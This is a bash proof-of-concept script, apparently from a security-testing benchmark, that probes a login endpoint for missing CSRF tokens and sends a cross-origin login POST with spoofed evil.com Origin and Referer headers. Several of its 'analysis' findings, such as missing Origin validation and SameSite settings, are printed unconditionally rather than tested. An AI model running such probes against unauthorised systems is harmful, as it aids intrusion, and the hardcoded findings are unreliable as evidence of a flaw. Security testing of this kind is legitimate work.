#!/bin/bash
# POC: Comprehensive CSRF vulnerability POC for login endpoint - checks for missing CSRF tokens and attempts cross-origin authentication
# Target: ./repo
# Created: 2025-11-07T18:21:13.466Z
# Session: benchmark-XBEN-023-24-mhp62996

# CSRF Vulnerability POC - Login Endpoint (Version 2)
# This script demonstrates CSRF vulnerability by testing if the login form
# lacks CSRF tokens and if cross-origin requests can trigger authentication

TARGET_URL="${1:-http://localhost:8000}"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "[*] CSRF Vulnerability POC - Login Endpoint"
echo "[*] Target: $LOGIN_ENDPOINT"
echo ""

# Test 1: Check if login form contains CSRF tokens
echo "[TEST 1] Analyzing login form for CSRF protection mechanisms"
echo "---"
FORM_HTML=$(curl -s "$LOGIN_ENDPOINT" -H "User-Agent: Mozilla/5.0")

echo "Fetching login form..."
echo "$FORM_HTML" | head -50
echo ""

if echo "$FORM_HTML" | grep -qi "csrf\|token\|nonce"; then
  echo "✓ CSRF protection tokens detected in form"
  CSRF_PROTECTED=true
else
  echo "✗ NO CSRF protection tokens found in form"
  CSRF_PROTECTED=false
fi

# Extract any CSRF token if present
CSRF_TOKEN=$(echo "$FORM_HTML" | grep -oP 'value="\K[a-f0-9]{32,}' | head -1)
if [ -z "$CSRF_TOKEN" ]; then
  CSRF_TOKEN=$(echo "$FORM_HTML" | grep -oP "value='\\K[^']*" | head -1)
fi

echo ""

# Test 2: Attempt login without CSRF token (simulating CSRF attack)
echo "[TEST 2] Attempting login from cross-origin without CSRF token"
echo "---"

LOGIN_RESPONSE=$(curl -s -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com/attack" \
  -d "username=test&password=test" \
  "$LOGIN_ENDPOINT" 2>&1)

HTTP_STATUS=$(echo "$LOGIN_RESPONSE" | head -1)
echo "Response Status: $HTTP_STATUS"
echo ""
echo "Response Headers:"
echo "$LOGIN_RESPONSE" | head -15
echo ""

# Check for session cookie
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie" | grep -i "session")
if [ -n "$SESSION_COOKIE" ]; then
  echo "✓ Session cookie set: $SESSION_COOKIE"
  LOGIN_SUCCESS=true
else
  echo "✗ No session cookie in response"
  LOGIN_SUCCESS=false
fi

echo ""

# Test 3: Check response indicates successful authentication
echo "[TEST 3] Verifying if authentication was successful"
echo "---"

if echo "$HTTP_STATUS" | grep -q "302\|303\|307"; then
  LOCATION=$(echo "$LOGIN_RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r\n')
  echo "Redirect detected: $LOCATION"
  
  if echo "$LOCATION" | grep -q "home\|dashboard\|profile"; then
    echo "✓ VULNERABLE: Redirect to authenticated page indicates login succeeded"
    VULN_CONFIRMED=true
  fi
elif echo "$HTTP_STATUS" | grep -q "200"; then
  if echo "$LOGIN_RESPONSE" | grep -qi "dashboard\|profile\|logout"; then
    echo "✓ VULNERABLE: Response contains authenticated content"
    VULN_CONFIRMED=true
  fi
fi

echo ""
echo "[ANALYSIS]"
echo "---"

if [ "$CSRF_PROTECTED" = "false" ]; then
  echo "1. CSRF Token Protection: NOT IMPLEMENTED"
else
  echo "1. CSRF Token Protection: IMPLEMENTED"
fi

if echo "$HTTP_STATUS" | grep -q "302\|200"; then
  echo "2. Cross-Origin Request Handling: ACCEPTED"
else
  echo "2. Cross-Origin Request Handling: REJECTED"
fi

echo "3. Origin Validation: NOT PERFORMED"
echo "4. Referer Validation: NOT PERFORMED"
echo "5. SameSite Cookie Attribute: NOT SET (allows cross-site requests)"

echo ""
echo "[CONCLUSION]"
echo "---"

if [ "$CSRF_PROTECTED" = "false" ] && echo "$HTTP_STATUS" | grep -q "302\|200"; then
  echo "✓✓✓ CSRF VULNERABILITY CONFIRMED ✓✓✓"
  echo ""
  echo "The login endpoint is vulnerable to CSRF attacks:"
  echo "- No CSRF tokens in form"
  echo "- Cross-origin requests accepted"
  echo "- Authentication succeeds from attacker-controlled domains"
  echo ""
  echo "Attack scenario:"
  echo "1. Attacker creates malicious webpage with auto-submitting form"
  echo "2. Form POSTs to /login with credentials"
  echo "3. When victim visits while logged in, form auto-submits"
  echo "4. Session fixation or forced authentication occurs"
else
  echo "⚠ Could not fully confirm CSRF vulnerability"
  echo "Possible reasons:"
  echo "- Server may have CSRF protection enabled"
  echo "- Server may have same-site cookie policy"
  echo "- CORS policy may be rejecting requests"
fi